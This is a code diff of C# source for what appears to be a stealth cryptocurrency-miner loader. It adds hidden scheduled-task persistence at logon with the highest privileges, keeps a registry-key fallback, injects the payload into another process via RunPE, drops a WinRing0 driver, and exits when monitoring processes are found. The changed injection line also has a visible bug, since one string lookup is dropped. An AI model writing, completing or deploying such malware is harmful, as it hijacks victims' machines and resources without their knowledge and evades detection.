@@ -6,9 +6,13 @@ using System.Management;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
+using System.Security.Principal;
 using System.Text;
 using System.Threading;
 using Microsoft.Win32;
+#if DefDebug
+using System.Windows.Forms;
+#endif
 
 #if DefAssembly
 [assembly: AssemblyTitle("%Title%")]
@@ -29,7 +33,19 @@ public partial class Program
     public static void Main()
     {
 #if DefInstall
-        Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(PayloadPath), PayloadPath);
+        if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
+        {
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = "cmd",
+                Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(PayloadPath) + "\"" + " /tr " + "'" + "\"" + (PayloadPath) + "\"" + "' & exit",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+            });
+        }else{
+            Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(PayloadPath), PayloadPath);
+        }
+       
         RInstall();
 #endif
         RInitialize();
@@ -64,7 +80,11 @@ public partial class Program
                 Environment.Exit(0);
             }
         }
-        catch{}
+        catch(Exception ex){
+#if DefDebug
+            MessageBox.Show(ex.ToString());
+#endif
+        }
     }
 #endif
 
@@ -81,12 +101,17 @@ public partial class Program
 
     public static void RRun(byte[] PL, string arg, byte[] buffer)
     {
-        // Credits gigajew for RunPE https://github.com/gigajew/WinXRunPE-x86_x64
+        // Credits gigajew for RunPE https://github.com/gigajew/Mandark
         try
         {
-            Assembly.Load(PL).GetType(RGetString("#DLLSTR")).GetMethod(RGetString("#DLLOAD"), BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { buffer, RGetString("#InjectionDir") + @"\" + RGetString("#InjectionTarget"), arg });
+            Assembly.Load(PL).GetType(RGetString("#DLLSTR")).GetMethod(RGetString("#DLLOAD"), BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { buffer, ("#InjectionDir") + @"\" + RGetString("#InjectionTarget"), arg });
         }
-        catch{}
+        catch (Exception ex)
+        {
+#if DefDebug
+            MessageBox.Show(ex.ToString());
+#endif
+        }
     }
 
     public static void RBaseFolder()
@@ -113,7 +138,12 @@ public partial class Program
 
             File.WriteAllBytes(bD + "WR64.sys", RGetTheResource("#winring"));
         }
-        catch { }
+        catch (Exception ex)
+        {
+#if DefDebug
+            MessageBox.Show(ex.ToString());
+#endif
+        }
     }
 
     public static bool RCheckProc()
@@ -175,15 +205,23 @@ public partial class Program
                             rS += " --opencl ";
                         }
                     }
-                    catch{}
+                    catch(Exception ex){
+#if DefDebug
+            MessageBox.Show(ex.ToString());
+#endif
+                    }
                 }
             }
-            catch{}
+            catch(Exception ex){
+#if DefDebug
+            MessageBox.Show(ex.ToString());
+#endif
+            }
 #endif
 
             string argstr = RGetString("#ARGSTR") + rS;
-            argstr = argstr.Replace("{%RANDOM%}", Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10));
-            argstr = argstr.Replace("{%COMPUTERNAME%}", System.Text.RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", "").Substring(0, 10));
+            argstr = argstr.Replace("{%RANDOM%}", RTruncate("R" +Guid.NewGuid().ToString().Replace("-", ""), 10));
+            argstr = argstr.Replace("{%COMPUTERNAME%}", RTruncate("C" +System.Text.RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", ""), 10));
             if (RCheckProc())
             {
                 Environment.Exit(0);
@@ -209,9 +247,28 @@ public partial class Program
                     }
                 }
             }
-            catch { }
+            catch (Exception ex)
+            {
+#if DefDebug
+            MessageBox.Show(ex.ToString());
+#endif
+            }
         }
-        catch { }
+        catch (Exception ex)
+        {
+#if DefDebug
+            MessageBox.Show(ex.ToString());
+#endif
+        }
+    }
+
+    public static string RTruncate(string value, int maxLength)
+    {
+        if (string.IsNullOrEmpty(value))
+        {
+            return value;
+        }
+        return value.Length > maxLength ? value.Substring(0, maxLength) : value;
     }
 
 #if DefGPU
